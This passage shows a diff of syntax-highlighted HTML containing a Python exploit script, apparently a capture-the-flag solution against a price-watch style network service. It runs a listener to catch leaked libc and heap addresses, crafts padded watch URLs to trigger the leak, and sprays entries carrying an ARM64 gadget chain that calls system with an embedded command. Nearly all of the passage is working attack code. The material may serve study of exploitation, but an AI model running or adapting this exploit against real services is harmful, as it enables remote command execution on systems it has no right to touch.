+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="sa">b</span><span class="s2">&#34;kind=rum&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">result_dict</span><span class="p">[</span><span class="s2">&#34;libc&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">addr</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">result_dict</span><span class="p">[</span><span class="s2">&#34;heap&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">addr</span>
+</span></span><span class="line"><span class="cl">                <span class="n">finish_ev</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># conn.send(b&#34;HTTP/1.1 200 OK\r\nServer: lol\r\nConnection: close\r\nContent-Length: 0\r\n\r\n&#34;)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># conn.close()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        try:
+</span></span></span><span class="line"><span class="cl"><span class="s2">            while True:
+</span></span></span><span class="line"><span class="cl"><span class="s2">                conn.send(data)
+</span></span></span><span class="line"><span class="cl"><span class="s2">                #conn.send(request_string.encode(&#34;utf-8&#34;))
+</span></span></span><span class="line"><span class="cl"><span class="s2">                time.sleep(5)
+</span></span></span><span class="line"><span class="cl"><span class="s2">        except BrokenPipeError:
+</span></span></span><span class="line"><span class="cl"><span class="s2">            print(&#39;[DEBUG] addr:&#39;, addr, &#39;Connection closed by client?&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="s2">        except Exception as ex:
+</span></span></span><span class="line"><span class="cl"><span class="s2">            print(&#39;[DEBUG] addr:&#39;, addr, &#39;Exception:&#39;, ex, )
+</span></span></span><span class="line"><span class="cl"><span class="s2">        finally:
+</span></span></span><span class="line"><span class="cl"><span class="s2">            conn.close()
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[DEBUG] create socket&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[DEBUG] bind:&#39;</span><span class="p">,</span> <span class="p">(</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span> <span class="mi">5</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span> <span class="mi">5</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[DEBUG] listen&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="s2">&#34;bye&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">result_dict</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[DEBUG] accept ... waiting&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span> <span class="c1"># socket, address</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[DEBUG] addr:&#39;</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">handle_client</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">addr</span><span class="p">),</span> <span class="n">daemon</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">leak</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">finish_ev</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result_dict</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">thr</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">leak_receiver</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">finish_ev</span><span class="p">,</span> <span class="n">result_dict</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">thr</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">random_hex</span> <span class="o">=</span> <span class="s1">&#39;d0bebc4a8f&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="p">,</span> <span class="n">s2</span><span class="p">,</span> <span class="n">s3</span> <span class="o">=</span> <span class="n">User</span><span class="p">(),</span> <span class="n">User</span><span class="p">(),</span> <span class="n">User</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;user1-</span><span class="si">{</span><span class="n">random_hex</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;user1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;user2-</span><span class="si">{</span><span class="n">random_hex</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;user2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s3</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;user3-</span><span class="si">{</span><span class="n">random_hex</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;user3&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">)</span>    
+</span></span><span class="line"><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">)</span>    
+</span></span><span class="line"><span class="cl">    <span class="n">s3</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">)</span>    
+</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;bomb&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;rum&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;anchor&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Watch gold</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Length need to be 0x4ff</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gold_url_1</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">PINGBACK_URL</span><span class="si">}</span><span class="s1">/?x=__/plugins&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x4ff</span><span class="p">,</span> <span class="s1">&#39;_&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Length need to be 0x43f</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gold_url_2</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">PINGBACK_URL</span><span class="si">}</span><span class="s1">/?x=__/plugins&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x43f</span><span class="p">,</span> <span class="s1">&#39;_&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">watch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">,</span> <span class="n">gold_url_1</span><span class="p">,</span> <span class="mi">123</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">watch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">,</span> <span class="n">gold_url_1</span><span class="p">,</span> <span class="mi">123</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s3</span><span class="o">.</span><span class="n">watch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">,</span> <span class="n">gold_url_2</span><span class="p">,</span> <span class="mi">123</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Watch bomb</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Length need to be 0x7d7</span>
+</span></span><span class="line"><span class="cl">    <span class="n">bomb_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">PINGBACK_URL</span><span class="si">}</span><span class="s1">/?x=__/plugins&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x7d7</span><span class="p">,</span> <span class="s1">&#39;_&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">watch</span><span class="p">(</span><span class="s2">&#34;bomb&#34;</span><span class="p">,</span> <span class="n">bomb_url</span><span class="p">,</span> <span class="mi">123</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Watch rum</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Length need to be 0x7e8</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rum_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">PINGBACK_URL</span><span class="si">}</span><span class="s1">/?x=__/plugins&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x7e8</span><span class="p">,</span> <span class="s1">&#39;_&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">watch</span><span class="p">(</span><span class="s2">&#34;rum&#34;</span><span class="p">,</span> <span class="n">rum_url</span><span class="p">,</span> <span class="mi">123</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Watch anchor</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Length need to be 0x800</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># The position of `bash xxx` need to be exact with this position</span>
+</span></span><span class="line"><span class="cl">    <span class="n">anchor_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">PINGBACK_URL</span><span class="si">}</span><span class="s1">/?x=__/plugins&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x800</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">COMMAND</span><span class="p">),</span> <span class="s1">&#39;_&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">COMMAND</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">watch</span><span class="p">(</span><span class="s2">&#34;anchor&#34;</span><span class="p">,</span> <span class="n">anchor_url</span><span class="p">,</span> <span class="mi">123</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># input(&#34;wait&#34;)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">notify</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Notified gold&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># input(&#34;wait&#34;)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">notify</span><span class="p">(</span><span class="s2">&#34;bomb&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Notified bomb&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># input(&#34;wait&#34;)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">notify</span><span class="p">(</span><span class="s2">&#34;rum&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Notified rum&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># input(&#34;wait&#34;)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">notify</span><span class="p">(</span><span class="s2">&#34;anchor&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Notified anchor&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s3</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;bomb&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;rum&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;anchor&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">finish_ev</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result_dict</span><span class="p">[</span><span class="s2">&#34;bye&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result_dict</span><span class="p">[</span><span class="s2">&#34;libc&#34;</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x170af8</span><span class="p">,</span> <span class="n">result_dict</span><span class="p">[</span><span class="s2">&#34;heap&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">M</span> <span class="o">=</span> <span class="s2">&#34;d&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">FLOWER</span> <span class="o">=</span> <span class="s2">&#34;E&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="mi">114514</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">RANDOMISH_STRING_FOR_M</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">2467</span><span class="p">))</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl"><span class="n">RANDOMISH_STRING_FOR_FLOWER</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">2467</span><span class="p">))</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl"><span class="n">PAYLOAD_OFFSET</span> <span class="o">=</span> <span class="p">[</span><span class="mi">258</span><span class="p">,</span> <span class="mi">550</span><span class="p">,</span> <span class="mi">729</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">517</span><span class="p">,</span> <span class="mi">941</span><span class="p">,</span> <span class="mi">999</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">490</span><span class="p">,</span> <span class="mi">544</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">off</span> <span class="ow">in</span> <span class="n">PAYLOAD_OFFSET</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">RANDOMISH_STRING_FOR_FLOWER</span><span class="p">[</span><span class="n">off</span><span class="p">]</span> <span class="o">=</span> <span class="n">RANDOMISH_STRING_FOR_FLOWER</span><span class="p">[</span><span class="n">off</span><span class="p">][:</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">COMMAND</span><span class="p">)]</span> <span class="o">+</span> <span class="n">COMMAND</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">libc_base</span><span class="p">,</span> <span class="n">somewhere_on_heap</span> <span class="o">=</span> <span class="n">leak</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc_base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">somewhere_on_heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># exit(0)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mov_x0_x19_blr_x20</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x21af8</span>
+</span></span><span class="line"><span class="cl">    <span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x40890</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x4141414141414141</span><span class="p">,</span> <span class="n">mov_x0_x19_blr_x20</span><span class="p">,</span> <span class="n">somewhere_on_heap</span> <span class="o">+</span> <span class="n">HEAP_OFF</span><span class="p">,</span> <span class="n">system</span><span class="p">,</span> <span class="mh">0x4545454545454545</span><span class="p">,</span> <span class="mh">0x4646464646464646</span><span class="p">,</span> <span class="mh">0x4747474747474747</span><span class="p">,</span> <span class="mh">0x4848484848484848</span><span class="p">,</span> <span class="mh">0x4949494949494949</span><span class="p">,</span> <span class="mh">0x5050505050505050</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">secret_for_flow</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x4242424200000000</span> <span class="o">+</span> <span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">off</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">PAYLOAD_OFFSET</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">secret_for_flow</span><span class="p">[</span><span class="n">off</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">User</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="s2">&#34;omguser&#34;</span><span class="p">,</span> <span class="s2">&#34;omgpass&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="n">s</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="n">M</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="n">s</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="n">FLOWER</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="o">.</span><span class="n">trange</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">watch</span><span class="p">(</span><span class="n">M</span><span class="p">,</span> <span class="s2">&#34;http://127.0.0.1/&#34;</span> <span class="o">+</span> <span class="n">RANDOMISH_STRING_FOR_M</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mh">0x4141414100000000</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="o">.</span><span class="n">trange</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">watch</span><span class="p">(</span><span class="n">FLOWER</span><span class="p">,</span> <span class="s2">&#34;http://127.0.0.2/&#34;</span> <span class="o">+</span> <span class="n">RANDOMISH_STRING_FOR_FLOWER</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">secret_for_flow</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
 </span></span><span class="line"><span class="cl">    <span class="c1"># Wait for auto vacuum</span>
 </span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">notify</span><span class="p">(</span><span class="n">FLOWER</span><span class="p">)</span>
